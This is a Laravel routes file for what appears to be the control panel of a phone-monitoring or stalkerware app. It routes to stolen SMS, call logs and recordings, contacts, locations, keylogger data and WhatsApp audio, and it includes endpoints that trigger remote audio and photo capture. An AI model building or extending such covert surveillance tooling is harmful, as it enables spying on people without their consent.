<?php

use App\Http\Controllers\CallLogController;
use App\Http\Controllers\CallRecordController;
use App\Http\Controllers\CaptureAudioController;
use App\Http\Controllers\CapturePhotoController;
use App\Http\Controllers\ContactController;
use App\Http\Controllers\DashboardController;
use App\Http\Controllers\GalleryController;
use App\Http\Controllers\KeyLoggerController;
use App\Http\Controllers\LocationsController;
use App\Http\Controllers\NotificationsController;
use App\Http\Controllers\SmsController;
use App\Http\Controllers\WhatsappAudioController;
use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider and all of them will
| be assigned to the "web" middleware group. Make something great!
|
*/

/*Route::get('/', function () {
    return view('welcome');
})->middleware('auth:sanctum');*/

    Route::get('/welcome' , function () {
        return view('welcome');
    })->name('welcome');

Route::middleware(['auth:sanctum'])->group(function () {
    Route::get('/', [DashboardController::class, 'index'])->name('dashboard');
    Route::get('/home', [DashboardController::class, 'index'])->name('dashboard');
    Route::get('/location', [LocationsController::class, 'location'])->name('location');
    Route::get('/locations', [LocationsController::class, 'index'])->name('locations');

    Route::get('/applications', [SmsController::class, 'index'])->name('smses');
    Route::get('/smses', [SmsController::class, 'index'])->name('smses');
    Route::get('/call-log', [CallLogController::class, 'index'])->name('call-log');
    Route::get('/contacts', [ContactController::class, 'index'])->name('contacts');

    Route::get('/keyloggers', [KeyLoggerController::class, 'index'])->name('keyloggers');
    Route::get('/notifications', [NotificationsController::class, 'index'])->name('notifications');

    Route::get('/notifications', [NotificationsController::class, 'index'])->name('notifications');

    Route::get('/capture-audio', [CaptureAudioController::class, 'index'])->name('capture-audio');
    Route::post('/capture-audio-command', [CaptureAudioController::class, 'takeCapture'])->name('capture-audio-command');

    Route::get('/capture-photo', [CapturePhotoController::class, 'index'])->name('capture-photo');
    Route::post('/capture-photo-command', [CapturePhotoController::class, 'takeCapture'])->name('capture-photo-command');

    Route::get('/call-record', [CallRecordController::class, 'index'])->name('call-records');
    Route::get('/galleries', [GalleryController::class, 'index'])->name('galleries');

    Route::get('/whatsapp-audio', [WhatsappAudioController::class, 'index'])->name('whatsapp-audio');

	Route::get('/test', [CapturePhotoController::class, 'place'])->name('test');
});
